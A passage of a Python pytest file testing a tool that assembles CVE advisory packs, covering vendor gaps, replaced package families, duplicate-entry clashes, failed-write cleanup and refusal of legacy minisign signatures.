            out.missing.append("Ubuntu has no record for CVE-2026-114406")
        else:
            out.conflicts.append("rhel:9 java-17-openjdk: Will not fix; name its binaries by hand")
        return out

    monkeypatch.setattr(fill, "build", build)
    accept = f'[{{gap = "{OTHER}: rhel:10 ca-certificates", reason = "read by hand"}}]'
    done = _write(
        store, tmp_path, clone, draft,
        packages_from=f'{{rhel = ["{OTHER}"]}}', packages_from_reason='"fixed in ca-certs"',
        accept=accept,
    )  # fmt: skip
    joined = "\n".join(done.needs_a_person)
    assert "java-17-openjdk" not in joined  # the replaced family's gap is gone
    assert f"{OTHER}: rhel:10 ca-certificates" in joined  # the stand-in's came in
    assert "ubuntu:24.04 x" not in joined  # but not its other family's


def test_a_stand_in_with_no_entries_is_refused(store, tmp_path, clone, ready, monkeypatch):
    draft, _ = ready
    _cve(store, OTHER)
    real = fill.build
    monkeypatch.setattr(
        fill, "build",
        lambda *a, **k: fill.Draft(cves=a[1], binary_filter=[]) if OTHER in a[1] else real(*a, **k),
    )  # fmt: skip
    with pytest.raises(
        assemble.AssembleError, match="gives no rhel entries with this binary filter"
    ):
        _write(store, tmp_path, clone, draft, packages_from=f'{{rhel = ["{OTHER}"]}}',
               packages_from_reason='"x"')  # fmt: skip


def test_confirmed_third_party_entries_stay_when_a_family_is_replaced(
    store, tmp_path, clone, ready, monkeypatch
):
    draft, _ = ready
    _cve(store, OTHER)
    real = fill.build

    def build(ctx, cves, filters, other="cant_judge", extra=None, unconfirmed=0):
        out = real(ctx, cves, filters, other, extra, unconfirmed)
        if OTHER not in cves:
            out.entries.append(fill.Entry("rhel:9", ["php-cli"], "*.remi", "8.3.27-1.el9.remi",
                                          "https://rpms.remirepo.net/", "remi"))  # fmt: skip
        return out

    monkeypatch.setattr(fill, "build", build)
    done = _write(store, tmp_path, clone, draft, packages_from=f'{{rhel = ["{OTHER}"]}}',
                  packages_from_reason='"x"')  # fmt: skip
    assert '"php-cli"' in done.path.read_text()


def test_a_vendor_not_tracking_a_cve_is_shown_not_blocking(
    store, tmp_path, clone, ready, monkeypatch
):
    draft, _ = ready
    real = fill.build

    def build(*args, **kwargs):
        out = real(*args, **kwargs)
        out.missing.append("Ubuntu has no record for CVE-2026-111497 (it doesn't track it)")
        return out

    monkeypatch.setattr(fill, "build", build)
    done = _write(store, tmp_path, clone, draft)
    assert any("Ubuntu has no record" in n for n in done.needs_a_person)


def test_clashes_are_reported_once(store, tmp_path, clone, ready):
    draft, _ = ready
    clash = '[{release = "rhel:9", binary_names = ["brotli"], source = "https://x.example/"}]'
    with pytest.raises(assemble.AssembleError) as caught:
        _write(store, tmp_path, clone, draft, by_hand=clash)
    lines = [ln for ln in str(caught.value).splitlines() if "in two entries" in ln]
    assert len(lines) == 1


def test_unknown_cves_are_reported_with_a_proposals_file_too(
    store, tmp_path, clone, ready, monkeypatch
):
    draft, _ = ready
    from drafter import thirdparty

    monkeypatch.setattr(thirdparty, "confirmed_entries", lambda text, cves, store: ([], 0, []))
    monkeypatch.setattr(thirdparty, "unknown_cves", lambda ctx, cves: [CVE])
    proposals = tmp_path / "p.toml"
    proposals.write_text("")
    a = assemble.read_assembly(_assembly(tmp_path, draft, thirdparty=f'"{proposals}"'))
    with pytest.raises(assemble.AssembleError, match="no NVD or CISA row"):
        assemble.write(store, object(), a, clone, now=lambda: NOW)


def test_a_failed_new_write_leaves_no_empty_folder(store, tmp_path, clone, ready, monkeypatch):
    draft, _ = ready

    def broken():
        raise sqlite3.OperationalError("disk full")

    monkeypatch.setattr(store, "transaction", broken)
    with pytest.raises(sqlite3.OperationalError):
        _write(store, tmp_path, clone, draft)
    assert not (clone / "packs" / "brotli-2026-10").exists()


def test_a_clone_without_a_dev_tracking_ref_is_still_compared(store, tmp_path, clone, ready):
    draft, _ = ready
    origin = tmp_path / "origin.git"
    _git(clone, "clone", "-q", "--bare", str(clone), str(origin))
    _git(clone, "remote", "add", "origin", str(origin))
    # fetched like a single-branch clone of main: a fetch of dev makes no origin/dev
    _git(clone, "config", "remote.origin.fetch", "+refs/heads/main:refs/remotes/origin/main")
    done = _write(store, tmp_path, clone, draft)
    assert not any("couldn't check" in n for n in done.needs_a_person)


@pytest.mark.skipif(shutil.which("minisign") is None, reason="minisign isn't installed")
def test_a_legacy_signature_is_refused(tmp_path):
    def run(*args):
        subprocess.run(["minisign", *args], check=True, capture_output=True, input=b"")  # noqa: S603, S607

    run("-G", "-W", "-p", str(tmp_path / "k.pub"), "-s", str(tmp_path / "k.key"))
    pack = tmp_path / "index.yaml"
    pack.write_text("x: 1\n")
    run("-S", "-l", "-s", str(tmp_path / "k.key"), "-m", str(pack))
    key = (tmp_path / "k.pub").read_text().splitlines()[1]
    with pytest.raises(assemble.AssembleError, match="legacy"):
        assemble.verify(pack, [key])


def test_a_clash_fill_already_reported_is_reported_once(store, tmp_path, clone, ready, monkeypatch):
    draft, _ = ready
    real = fill.build

    def build(*args, **kwargs):
        out = real(*args, **kwargs)
        out.entries.append(
            fill.Entry(
                "rhel:9",
                ["brotli"],
                None,
                "1.0.9-8.el9",
                "https://access.redhat.com/errata/RHSA-2026:3",
                "redhat",
            )
        )
        fill._merge(out)  # as fill.build does
        return out  # fmt: skip

    monkeypatch.setattr(fill, "build", build)
    with pytest.raises(assemble.AssembleError) as caught:
        _write(store, tmp_path, clone, draft)
    assert sum("in two entries" in ln for ln in str(caught.value).splitlines()) == 1
